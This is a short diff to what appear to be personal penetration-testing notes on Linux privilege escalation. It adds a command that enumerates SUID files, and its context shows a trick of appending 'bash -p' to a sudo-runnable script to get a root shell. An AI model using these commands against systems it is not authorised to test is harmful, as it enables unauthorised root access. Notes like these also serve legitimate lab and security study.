@@ -532,3 +532,9 @@ sudo -l <-- find monitor.sh
         we can add a command at the end of the script:
             echo "bash -p" >> monitor.sh
             sudo -u root ./monitor.sh
+
+###########
+Linux SUID ls
+###########
+
+find / -perm -u=s -type f -ls 2>/dev/null
